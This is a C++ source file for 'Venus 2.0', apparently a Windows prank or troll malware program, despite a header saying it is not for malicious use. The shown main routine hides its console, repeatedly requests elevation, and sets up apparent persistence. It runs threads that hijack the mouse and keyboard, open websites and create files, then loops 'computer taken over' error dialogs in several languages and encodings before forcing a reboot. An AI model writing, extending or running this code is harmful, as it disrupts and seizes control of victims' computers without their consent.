/*
    <!--Venus 2.0 made by Trintonique-->
    <!--This is NOT to be used for malicious purposes for any reason-->
    <!--If you want to talk add me on Discord my name is just trintonique-->
*/

#include <iostream>
#include "Venus.hpp"
#include <thread>
#include <windows.h>

std::vector<std::string> errorWindows({
    "Error",
    "rorrE",
    "Error",
    "Erreur",
    "Σφάλμα",
    "Fout",
    "Chyba",
    "Błąd",
    "შეცდომა",
    "01000101 01110010 01110010 01101111 01110010",
    "Lyyvy",
    "RXJyb3I="
});

std::vector<std::string> errorMessages({
    "Computer taken over by Venus.exe, press OK to restart computer.",
    ".retupmoc tratser ot KO sserp ,exe.suneV yb revo nekat retupmoC",
    "La computadora está tomada por Venus.exe, presione OK para reiniciar la computadora.",
    "L'ordinateur est pris en charge par Venus.exe, appuyez sur OK pour redémarrer l'ordinateur.",
    "Υπολογιστής που αναλήφθηκε από το Venus.exe, πατήστε OK για επανεκκίνηση του υπολογιστή.",
    "Rekenaar oorgeneem deur Venus.exe, druk OK om rekenaar te herbegin.",
    "Počítač převzatý Venus.exe, stiskněte OK pro restartování počítače.",
    "Komputer przejęty przez Venus.exe, naciśnij OK, aby ponownie uruchomić komputer.",
    "Venus.exe-ის მიერ გადაღებული კომპიუტერი, დააჭირეთ OK კომპიუტერის გადატვირთვისთვის.",
    "01000011 01101111 01101101 01110000 01110101 01110100 01100101 01110010 00100000 01110100 01100001 01101011 01100101 01101110 00100000 01101111 01110110 01100101 01110010 00100000 01100010 01111001 00100000 01010110 01100101 01101110 01110101 01110011 00101110 01100101 01111000 01100101 00101100 00100000 01110000 01110010 01100101 01110011 01110011 00100000 01001111 01001011 00100000 01110100 01101111 00100000 01110010 01100101 01110011 01110100 01100001 01110010 01110100 00100000 01100011 01101111 01101101 01110000 01110101 01110100 01100101 01110010 00101110",
    "Jvtwbaly ahrlu vcly if Clubz.lel, wylzz VR av ylzahya jvtwbaly.",
    "Q29tcHV0ZXIgdGFrZW4gb3ZlciBieSBWZW51cy5leGUsIHByZXNzIE9LIHRvIHJlc3RhcnQgY29tcHV0ZXIu"
});

void openWebsites();

void moveMouse();

void createFiles(int fileTimer, int minTimer);

void startupCopy();

void loopFile();

void molest();

void requestElevation();

void randomKeys();

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    requestElevation();
    if(std::ifstream(std::string(userPath) + "\\AppData\\Local\\Venus\\venus")) {
        createFiles(10, 1);
        bool ok = false;
        int cancel = 0;
        while(!ok) {
            requestElevation();
            // Future me make dynamic and funny messages if they press cancel
            int okCancel = MessageBoxW(NULL, std::wstring(errorMessages[cancel].begin(), errorMessages[cancel].end()).c_str(), std::wstring(errorWindows[cancel].begin(), errorWindows[cancel].end()).c_str(), MB_ICONERROR | MB_OKCANCEL);
            if(okCancel == IDOK) {
                ok = true;
            }
            cancel += 1;
            if(cancel >= errorMessages.size()) {
                cancel = 0;
            }
        }
        if(!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0)) {
            molest();
            std::cout << "B";
        }
    }
    else {
        loopFile();
        std::thread mouseThread(moveMouse);
        std::thread keyThread(randomKeys);
        Sleep(30 * 1000);
        std::thread websiteThread(openWebsites);
        std::thread fileThread(createFiles, 60, 10);
        mouseThread.join();
        websiteThread.join();
        fileThread.join();
    }
}